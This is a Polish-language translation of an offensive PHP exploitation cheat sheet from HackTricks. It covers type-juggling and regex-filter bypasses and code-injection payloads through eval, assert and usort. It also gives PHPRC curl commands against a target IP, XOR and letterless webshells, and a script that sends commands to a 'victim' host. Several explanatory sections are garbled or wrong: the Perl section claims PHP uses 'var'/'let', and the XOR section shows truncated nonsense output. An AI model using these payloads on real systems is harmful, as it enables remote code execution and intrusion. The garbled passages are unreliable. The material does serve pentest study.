# Sztuczki w PHP

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>

## Wspólne lokalizacje plików cookie:

To również dotyczy plików cookie phpMyAdmin.

Pliki cookie:
```
PHPSESSID
phpMyAdmin
```
Lokacje:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## Omijanie porównań w PHP

### Luźne porównania / Type Juggling ( == )

Jeśli w PHP używane jest `==`, istnieją przypadki, w których porównanie nie zachowuje się tak, jak oczekiwano. Wynika to z faktu, że "==" porównuje tylko wartości przekształcone do tego samego typu. Jeśli chcesz również porównać, czy typ danych jest taki sam, musisz użyć `===`.

Tabele porównań w PHP: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` - Ciąg znaków, który nie zaczyna się od liczby, jest równy liczbie
* `"0xAAAA" == "43690" -> True` - Ciągi składające się z liczb w formacie dziesiętnym lub szesnastkowym można porównywać z innymi liczbami/ciągami, a wynik będzie równy True, jeśli liczby będą takie same (liczby w ciągu są interpretowane jako liczby)
* `"0e3264578" == 0 --> True` - Ciąg znaków rozpoczynający się od "0e" i po nim dowolne znaki będzie równy 0
* `"0X3264578" == 0X --> True` - Ciąg znaków rozpoczynający się od "0" i po nim dowolna litera (X może być dowolną literą) i po niej dowolne znaki będzie równy 0
* `"0e12334" == "0" --> True` - Jest to bardzo interesujące, ponieważ w niektórych przypadkach można kontrolować ciąg wejściowy "0" i pewną zawartość, która jest haszowana i porównywana z nim. Dlatego jeśli możesz podać wartość, która utworzy hasz zaczynający się od "0e" i bez żadnej litery, możesz ominąć porównanie. Możesz znaleźć **już zahaszowane ciągi** w tym formacie tutaj: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` - Dowolna litera w ciągu jest równa liczbie całkowitej 0

Więcej informacji na stronie [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**Type Juggling** również wpływa na funkcję `in_array()` domyślnie (musisz ustawić trzeci argument na true, aby dokonać ścisłego porównania):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

Jeśli ta funkcja jest używana do **jakiejkolwiek weryfikacji uwierzytelniania** (takiej jak sprawdzanie hasła) i użytkownik kontroluje jedną stronę porównania, może wysłać pusty tablicę zamiast ciągu znaków jako wartość hasła (`https://example.com/login.php/?username=admin&password[]=`) i ominąć tę weryfikację:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
Ten sam błąd występuje przy użyciu `strcasecmp()`.

### Surowe rzutowanie typów

Nawet jeśli używane jest `===`, mogą wystąpić błędy, które czynią porównanie podatnym na surowe rzutowanie typów. Na przykład, jeśli porównanie konwertuje dane na inny typ obiektu przed porównaniem:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** może być używane do **walidacji danych wprowadzanych przez użytkownika** (sprawdza, czy na **wprowadzonych danych użytkownika** znajduje się **jakiekolwiek słowo/regex** z **czarnej listy**, jeśli nie, kod może kontynuować swoje wykonanie).

#### Ominięcie nowej linii

Jednak, gdy określamy początek wyrażenia regularnego `preg_match()`, **sprawdzane jest tylko pierwsze linia danych wprowadzanych przez użytkownika**, więc jeśli w jakiś sposób możesz **przesłać** dane wejściowe w **kilku liniach**, możesz ominiąć tę kontrolę. Przykład:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Aby ominąć tę kontrolę, możesz **wysłać wartość z zakodowanymi znakami nowej linii** (`%0A`) lub jeśli możesz wysłać **dane JSON**, wyślij je w **kilku wierszach**:
```php
{
"cmd": "cat /etc/passwd"
}
```
Przykład można znaleźć tutaj: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Bypass błędu długości**

(Ten bypass został przetestowany na PHP 5.2.5 i nie udało mi się go uruchomić na PHP 7.3.15)\
Jeśli możesz przesłać do `preg_match()` prawidłowe, bardzo **duże dane wejściowe**, to **nie będzie w stanie ich przetworzyć** i będziesz mógł **obejść** tę kontrolę. Na przykład, jeśli jest na czarnej liście JSON, możesz przesłać:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### Przełamanie ReDoS

Sztuczka z: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223)


<figure><img src="../../../.gitbook/assets/image (10).png" alt=""><figcaption></figcaption></figure>

W skrócie problem występuje, ponieważ funkcje `preg_*` w PHP opierają się na bibliotece [PCRE](http://www.pcre.org/). W PCRE niektóre wyrażenia regularne są dopasowywane za pomocą wielu rekurencyjnych wywołań, co zużywa dużo miejsca na stosie. Można ustawić limit na ilość rekursji, ale w PHP ten limit [domyślnie wynosi 100 000](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit), co przekracza rozmiar stosu.

[Wątek na Stackoverflow](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) również został podlinkowany w poście, gdzie bardziej szczegółowo omówiono ten problem. Nasze zadanie było jasne:\
**Wysłać dane wejściowe, które spowodują, że wyrażenie regularne wykona ponad 100 000 rekursji, powodując SIGSEGV, co spowoduje, że funkcja `preg_match()` zwróci `false`, a aplikacja uzna, że nasze dane wejściowe nie są złośliwe, rzucając niespodziankę na końcu ładunku, na przykład `{system(<bardzozłałakomend>)}` aby uzyskać SSTI --> RCE --> flaga :)**.

No cóż, w terminach wyrażeń regularnych, tak naprawdę nie wykonujemy 100 tysięcy "rekursji", ale zamiast tego liczymy "kroki cofania", które, jak [dokumentacja PHP](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) mówi, domyślnie wynoszą 1 000 000 (1M) w zmiennej `pcre.backtrack_limit`.\
Aby to osiągnąć, `'X'*500_001` spowoduje wykonanie 1 miliona kroków cofania (500 tysięcy do przodu i 500 tysięcy do tyłu):
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### Type Juggling dla obfuskacji w PHP

Type Juggling (konwersja typów) jest techniką, która może być wykorzystana do obfuskacji kodu w PHP. Polega ona na manipulacji typami danych w celu ukrycia prawdziwego znaczenia kodu. 

W PHP, konwersja typów może być wykonywana automatycznie przez interpreter, co może prowadzić do nieoczekiwanych rezultatów. Możemy wykorzystać tę cechę do zaciemnienia kodu i utrudnienia jego analizy.

Przykładem jest porównanie dwóch zmiennych różnych typów, które mogą być równe dla interpretera PHP, ale nie dla człowieka. Na przykład:

```php
$var1 = "123";
$var2 = 123;

if ($var1 == $var2) {
    echo "Równe";
} else {
    echo "Różne";
}
```

Interpreter PHP traktuje te dwie zmienne jako równe, ponieważ wykonuje konwersję typów. Jednak dla człowieka jest to oczywiście różnica między ciągiem znaków a liczbą.

Możemy wykorzystać tę cechę do ukrycia prawdziwych wartości zmiennych lub warunków logicznych w kodzie. Na przykład, możemy użyć konwersji typów do ukrycia ciągu znaków reprezentującego hasło:

```php
$password = "5eba61e4c9b93f3f0682250b6cf8331b7ee68fd8"; // Hash hasła

if ($password == $_GET['password']) {
    echo "Dostęp przyznany";
} else {
    echo "Dostęp zabroniony";
}
```

W tym przypadku, jeśli podamy ciąg znaków jako parametr `password` w adresie URL, interpreter PHP automatycznie przekonwertuje go na liczbę i porówna z haszem hasła. Możemy wykorzystać tę cechę do próby odgadnięcia prawdziwego hasła.

Type Juggling jest jedną z wielu technik, które mogą być wykorzystane do obfuskacji kodu w PHP. Ważne jest, aby być świadomym tych technik i zabezpieczyć kod przed potencjalnymi atakami.
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## Wykonaj po przekierowaniu (EAR)

Jeśli PHP przekierowuje na inną stronę, ale nie jest wywoływana żadna funkcja **`die`** lub **`exit`** **po ustawieniu nagłówka `Location`**, PHP kontynuuje wykonywanie i dołącza dane do ciała:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Więcej sztuczek

* **register\_globals**: W **PHP < 4.1.1.1** lub jeśli jest źle skonfigurowany, **register\_globals** może być aktywny (lub ich zachowanie jest naśladowane). Oznacza to, że w zmiennych globalnych, takich jak $\_GET, jeśli mają wartość np. $\_GET\["param"]="1234", można uzyskać do niej dostęp za pomocą **$param**. Dlatego, wysyłając parametry HTTP, można nadpisać zmienne, które są używane w kodzie.
* Ciasteczka **PHPSESSION dla tej samej domeny są przechowywane w tym samym miejscu**, dlatego jeśli w obrębie domeny **różne ciasteczka są używane w różnych ścieżkach**, można sprawić, że jedna ścieżka **uzyska dostęp do ciasteczka z innej ścieżki**, ustawiając wartość ciasteczka z innej ścieżki.\
W ten sposób, jeśli **obie ścieżki mają dostęp do zmiennej o tej samej nazwie**, można sprawić, że **wartość tej zmiennej w ścieżce 1 zostanie zastosowana do ścieżki 2**. A następnie ścieżka 2 będzie uważać zmienne ścieżki 1 za ważne (nadając ciasteczku nazwę, która odpowiada jej w ścieżce 2).
* Gdy masz **nazwy użytkowników** użytkowników maszyny. Sprawdź adres: **/\~\<USERNAME>**, aby sprawdzić, czy katalogi php są aktywowane.
* [**LFI i RCE za pomocą php wrappers**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Te funkcje są typowo używane w PHP do **generowania skrótów z hasłami** i do **sprawdzania**, czy hasło jest poprawne w porównaniu ze skrótem.\
Obsługiwane algorytmy to: `PASSWORD_DEFAULT` i `PASSWORD_BCRYPT` (zaczyna się od `$2y$`). Należy zauważyć, że **PASSWORD\_DEFAULT jest często takie samo jak PASSWORD\_BCRYPT**. Obecnie **PASSWORD\_BCRYPT** ma **ograniczenie rozmiaru wejścia do 72 bajtów**. Dlatego, gdy próbujesz wygenerować skrót dla czegoś większego niż 72 bajty za pomocą tego algorytmu, zostanie użytych tylko pierwszych 72B:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### Omijanie nagłówków HTTP poprzez wykorzystanie błędów PHP

Jeśli **strona PHP drukuje błędy i wyświetla dane wprowadzone przez użytkownika**, użytkownik może sprawić, że serwer PHP wydrukuje **treść wystarczająco długą**, aby podczas próby **dodania nagłówków** do odpowiedzi serwera wystąpił błąd.\
W poniższym scenariuszu **atakujący spowodował, że serwer wygenerował duże błędy**, i jak widać na zrzucie ekranu, kiedy PHP próbowało **zmodyfikować informacje nagłówka, nie udało się to** (na przykład nagłówek CSP nie został wysłany do użytkownika):

![](<../../../.gitbook/assets/image (465).png>)

## Wykonanie kodu

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Sprawdź to, aby uzyskać więcej przydatnych funkcji PHP](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
Aby wykonać kod w argumencie "replace", wymagane jest co najmniej jedno dopasowanie.\
Ta opcja preg\_replace została **przestarzała od wersji PHP 5.5.0.**

### **RCE za pomocą Eval()**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **RCE poprzez Assert()**

Ta funkcja w PHP umożliwia **wykonanie kodu zapisanego w ciągu znaków** w celu **zwrócenia wartości true lub false** (i w zależności od tego zmienić wykonanie). Zazwyczaj zmienna użytkownika zostanie wstawiona w środku ciągu znaków. Na przykład:\
`assert("strpos($_GET['page']),'..') === false")` --> W tym przypadku, aby uzyskać **RCE**, można zrobić:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
Będziesz musiał **złamać** składnię kodu, **dodać** swój **payload**, a następnie **naprawić** go ponownie. Możesz użyć operacji logicznych, takich jak "**and" lub "%26%26" lub "|"**. Zauważ, że "or" lub "||" nie działają, ponieważ jeśli pierwszy warunek jest prawdziwy, nasz payload nie zostanie wykonany. Podobnie nie działa ";", ponieważ nasz payload nie zostanie wykonany.

**Inną opcją** jest dodanie do ciągu wykonania polecenia: `'.highlight_file('.passwd').'`

**Inną opcją** (jeśli masz dostęp do kodu wewnętrznego) jest zmodyfikowanie pewnej zmiennej w celu zmiany wykonania: `$file = "hola"`

### **RCE za pomocą usort()**

Ta funkcja służy do sortowania tablicy elementów za pomocą określonej funkcji.\
Aby wykorzystać tę funkcję:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
Możesz również użyć **//** aby skomentować resztę kodu.

Aby odkryć liczbę nawiasów, które musisz zamknąć:

* `?order=id;}//`: otrzymujemy komunikat o błędzie (`Parse error: syntax error, unexpected ';'`). Prawdopodobnie brakuje nam jednego lub więcej nawiasów.
* `?order=id);}//`: otrzymujemy **ostrzeżenie**. Wygląda na to, że jest to prawidłowe.
* `?order=id));}//`: otrzymujemy komunikat o błędzie (`Parse error: syntax error, unexpected ')' i`). Prawdopodobnie mamy zbyt wiele zamykających nawiasów.

### **RCE za pomocą pliku .httaccess**

Jeśli możesz **załadować** plik **.htaccess**, możesz **skonfigurować** wiele rzeczy, a nawet wykonać kod (konfigurując, że pliki o rozszerzeniu .htaccess mogą być **wykonywane**).

Różne powłoki .htaccess można znaleźć [tutaj](https://github.com/wireghoul/htshells)

### RCE za pomocą zmiennych środowiskowych

Jeśli znajdziesz podatność, która umożliwia **modyfikację zmiennych środowiskowych w PHP** (oraz inną do przesyłania plików, chociaż po dokładniejszych badaniach może to być obejśc), możesz wykorzystać to zachowanie do uzyskania **RCE**.

* [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Ta zmienna środowiskowa pozwala na ładowanie dowolnych bibliotek podczas wykonywania innych binarnych plików (choć w tym przypadku może nie działać).
* **`PHPRC`** : Wskazuje PHP, **gdzie znajduje się plik konfiguracyjny**, zwykle nazywany `php.ini`. Jeśli możesz przesłać własny plik konfiguracyjny, użyj `PHPRC`, aby wskazać PHP na niego. Dodaj wpis **`auto_prepend_file`**, wskazujący na drugi przesłany plik. Ten drugi plik zawiera normalny **kod PHP, który jest następnie wykonywany** przez środowisko wykonawcze PHP przed innym kodem.
1. Prześlij plik PHP zawierający nasz kod powłoki
2. Prześlij drugi plik zawierający dyrektywę **`auto_prepend_file`**, instruującą preprocesor PHP do wykonania pliku przesłanego w kroku 1
3. Ustaw zmienną `PHPRC` na plik przesłany w kroku 2.
* Uzyskaj więcej informacji na temat wykonania tego łańcucha [**z oryginalnego raportu**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/).
* **PHPRC** - inna opcja
* Jeśli **nie możesz przesyłać plików**, możesz użyć w FreeBSD pliku "/dev/fd/0", który zawiera **`stdin`**, będący **treścią** żądania wysłanego do `stdin`:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
* Lub aby uzyskać RCE, włącz **`allow_url_include`** i dodaj plik z **kodem PHP w formacie base64**:
* `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
* Technika [**z tego raportu**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## Statyczna analiza PHP

Sprawdź, czy możesz wstawić kod w wywołania tych funkcji (z [tutaj](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
Jeśli debugujesz aplikację PHP, możesz globalnie włączyć wyświetlanie błędów w pliku `/etc/php5/apache2/php.ini`, dodając `display_errors = On`, a następnie zrestartować Apache: `sudo systemctl restart apache2`

### Deobfuskacja kodu PHP

Możesz użyć strony **www.unphp.net** do deobfuskacji kodu PHP.

## Wrapper-y i protokoły PHP

Wrapper-y i protokoły PHP mogą umożliwić obejście zabezpieczeń zapisu i odczytu w systemie oraz jego kompromitację. Aby uzyskać więcej informacji, sprawdź [tę stronę](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols).

## Xdebug RCE bez uwierzytelnienia

Jeśli zauważysz, że **Xdebug** jest **włączony** w wyniku polecenia `phpconfig()`, spróbuj uzyskać zdalne wykonanie kodu za pomocą [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## Zmienne zmiennych
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Wykorzystywanie RCE za pomocą $\_GET\["a"]\($\_GET\["b"])

Jeśli na stronie możesz **utworzyć nowy obiekt dowolnej klasy**, możesz być w stanie uzyskać RCE, sprawdź następującą stronę, aby dowiedzieć się jak:

{% content-ref url="php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Wykonanie PHP bez liter

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### Użycie ósemkowego systemu liczbowego
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR (Exclusive OR) jest operatorem logicznym, który wykonuje operację bitową na dwóch operandach. Wynik XOR jest prawdziwy tylko wtedy, gdy jeden z operandów jest prawdziwy, a drugi jest fałszywy. W kontekście programowania, XOR jest często używany do szyfrowania i deszyfrowania danych.

W PHP, operator XOR jest reprezentowany przez symbol `^`. Może być używany do wykonywania operacji XOR na dwóch liczbach lub na dwóch ciągach znaków. Jeśli operandy są liczbami, XOR zostanie wykonane na ich binarnych reprezentacjach. Jeśli operandy są ciągami znaków, XOR zostanie wykonane na ich kodach ASCII.

Przykład użycia operatora XOR w PHP:

```php
$number1 = 10;
$number2 = 5;

$result = $number1 ^ $number2;
echo $result; // Output: 15

$string1 = "Hello";
$string2 = "World";

$result = $string1 ^ $string2;
echo $result; // Output: 
```

W powyższym przykładzie, wynik operacji XOR dla liczb 10 i 5 wynosi 15. Wynik operacji XOR dla ciągów znaków "Hello" i "World" to ciąg znaków o kodach ASCII .

Operator XOR może być również używany do prostego szyfrowania i deszyfrowania danych. Na przykład, możemy zaszyfrować ciąg znaków, wykonując operację XOR na jego kodach ASCII i kluczu, a następnie odszyfrować go wykonując operację XOR na zaszyfrowanym ciągu i tym samym kluczu.

```php
$string = "Secret message";
$key = "Key";

$encrypted = $string ^ $key;
echo $encrypted; // Output: \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If ¢___ not needed then $_($__), show_source(.passwd)
```
### XOR łatwy kod powłoki

Zgodnie z [**tym opisem**](https://mgp25.com/ctf/Web-challenge/), można wygenerować łatwy kod powłoki w ten sposób:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Więc jeśli możesz **wykonać dowolny kod PHP bez użycia cyfr i liter**, możesz wysłać żądanie, wykorzystując taki ładunek, aby wykonać dowolny kod PHP:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Dla bardziej szczegółowego wyjaśnienia sprawdź [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### Kod powłoki XOR (wewnątrz eval)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl podobny

Perl jest językiem programowania, który jest często wykorzystywany w skryptach CGI (Common Gateway Interface) do tworzenia dynamicznych stron internetowych. Jeśli jesteś programistą, który zna Perl, możesz wykorzystać swoją wiedzę w celu pisania skryptów PHP w podobny sposób.

Oto kilka wskazówek, które pomogą Ci pisać kod PHP w stylu Perl:

#### Zmienne

W Perl, deklaracja zmiennej nie jest wymagana. Możesz po prostu przypisać wartość do zmiennej i używać jej w kodzie. W PHP, zaleca się jednak deklarowanie zmiennych przed ich użyciem. Możesz to zrobić za pomocą słowa kluczowego `var` lub `let`.

```php
$zmienna = "Witaj, świecie!";
echo $zmienna;
```

#### Tablice

W Perl, tablice są dynamiczne i nie musisz określać ich rozmiaru podczas deklaracji. W PHP, możesz użyć funkcji `array()` lub skróconej składni `[]` do tworzenia tablic.

```php
@tablica = ("jabłko", "banan", "pomarańcza");
echo $tablica[0]; // wyświetli "jabłko"
```

#### Pętle

W Perl, pętla `foreach` jest często używana do iteracji po elementach tablicy. W PHP, możesz użyć pętli `foreach` lub pętli `for` do tego samego celu.

```php
@tablica = ("jabłko", "banan", "pomarańcza");
foreach ($tablica as $element) {
    echo $element;
}
```

#### Wyrażenia regularne

W Perl, wyrażenia regularne są często używane do manipulacji i przetwarzania tekstów. W PHP, możesz użyć funkcji takich jak `preg_match()` lub `preg_replace()` do pracy z wyrażeniami regularnymi.

```php
$tekst = "Witaj, świecie!";
if (preg_match("/świecie/", $tekst)) {
    echo "Znaleziono dopasowanie!";
}
```

#### Funkcje

W Perl, funkcje są definiowane za pomocą słowa kluczowego `sub`. W PHP, możesz użyć słowa kluczowego `function` do definiowania funkcji.

```php
function powitanie($imie) {
    echo "Witaj, $imie!";
}

powitanie("Jan"); // wyświetli "Witaj, Jan!"
```

Pamiętaj, że choć PHP i Perl mają wiele podobieństw, istnieją również różnice w składni i funkcjonalności. Ważne jest, aby być świadomym tych różnic i dostosować swój kod odpowiednio.
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
$__++;$__++;$__++;$__++; // E
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R
$___.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$___.=$__;

$____='_';
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S
$____.=$__;
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T
$____.=$__;

$_=$$____;
$___($_[_]); // ASSERT($_POST[_]);
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriów github.

</details>
